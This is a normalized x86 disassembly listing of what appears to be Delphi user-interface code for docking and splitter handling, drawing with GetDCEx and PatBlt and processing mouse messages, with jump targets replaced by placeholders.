push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d6c
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042b0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov eax [ ebx + 0x14 ]
call sub_44ee98
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d6c
mov edx [ ebp - 0x10 ]
pop eax
call sub_4042b0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4509ac
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40400c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_44f248
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44f3c0
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_44f3fc
mov eax [ ebx + 0x18 ]
call sub_44f248
mov [ edx + 0x18 ] eax
push esi
push sub_450f48
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44f774
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_44f3fc
mov eax [ esi + 0x64 ]
call sub_44f3c0
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403270
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_450f20
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403270
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44ef44
mov edx eax
mov eax edi
call sub_44f3e8
mov eax edi
call sub_44f248
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_450f48
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44f774
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_450f48
mov edx [ eax + 0x14 ]
mov eax esi
call sub_44f774
mov eax [ ebx + 0x14 ]
call sub_403270
mov eax edi
call sub_403270
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_4509b4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44bb84
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407e6c
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44f3e8
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44baf0
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44f3e8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_450dd0
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_450f48
xor edx edx
mov eax edi
call sub_44f774
sub_450a90
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44f3c0
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402aa0
mov edx eax
mov eax ebx
call sub_44f3e8
sub_450acc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404498
xor eax eax
push ebp
push sub_450b37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042a8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b3e
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_450b44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_450bf3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f150
mov eax [ ebp - 0x8 ]
call sub_450acc
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_450b44
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bfa
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_450b44
pop ecx
sub_450c00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450d39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450ce8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44baf0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450cef
mov eax [ ebp - 0x10 ]
call sub_403270
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_450acc
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44bb04
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_450cef
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_450b44
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450d40
lea eax [ ebp - 0x14 ]
call sub_403fe8
retn
sub_450d48
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44f498
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f4c0
call sub_450d48
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f498
call sub_450d48
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44eec8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44f3c0
mov edx eax
mov eax ebx
call sub_44f3e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44f3e8
jmp r-xdata
sub_450dd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_450d48
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_450e14
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44f3c0
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44f3e8
sub_450e44
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_44d054
mov edx eax
mov eax [ rw-data ]
call sub_4519a4
mov eax [ ebx + 0x14 ]
call sub_44d054
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_450f58
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_450ea4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_4519a4
mov eax ebx
call sub_450f58
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44f3e8
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44f3e8
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_450dd0
push ebx
push sub_450f48
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44f774
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_450f20
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44baf0
test eax eax
jle r-xdata
push ebx
push sub_450f48
xor edx edx
mov eax ebx
call sub_44f774
sub_450f58
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_44ef8c
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_44ef8c
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_44eff8
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_44eff8
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424118
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push r--data
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_451044
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_451044
pop ecx
mov eax ebx
call sub_44f3c0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f3c0
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_451044
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44f3c0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4295ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_4510d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f3c0
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44ef44
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_44f3c0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_451044
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_451124
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_446104
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446104
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_4511a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44ee50
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_44eefc
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_44f4a4
test eax eax
je r-xdata
mov eax esi
call sub_44eec8
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_450f48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_44f774
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44f4a4
mov edx [ ebx + 0x20 ]
call sub_44f3fc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_4511a0
pop ecx
sub_451220
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44eeac
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_44eeac
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_44f4a4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_451220
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_450f48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_44f774
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_44f0a8
mov eax edi
call sub_44f498
test eax eax
je r-xdata
mov eax edi
call sub_44f4a4
mov esi eax
mov eax esi
call sub_44f3c0
push eax
mov eax esi
call sub_44eefc
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44f498
call sub_44f3c0
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_44f3c0
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44f3e8
mov eax esi
call sub_44f3c0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44f3e8
mov eax edi
call sub_44f4a4
call sub_44f438
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_44eefc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44f3e8
mov eax edi
call sub_44f498
call sub_44f438
mov bl 0x1
jmp r-xdata
sub_451358
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f70c
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416eec
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44ff00
test eax eax
je r-xdata
push ebp
call sub_4511a0
pop ecx
push ebp
call sub_451220
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_451124
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_4513e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_44ef8c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_44ef8c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4510d4
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4510d4
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_451470
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451848
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406bf8
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44ff00
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_450ea4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406bf8
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ff00
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4462a8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45184f
lea eax [ ebp - 0x48 ]
call sub_403fe8
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44d054
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_444fc4
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_447458
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fe8
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_451358
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44bb84
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_450f58
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406bf8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_4513e0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_450f58
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406bf8
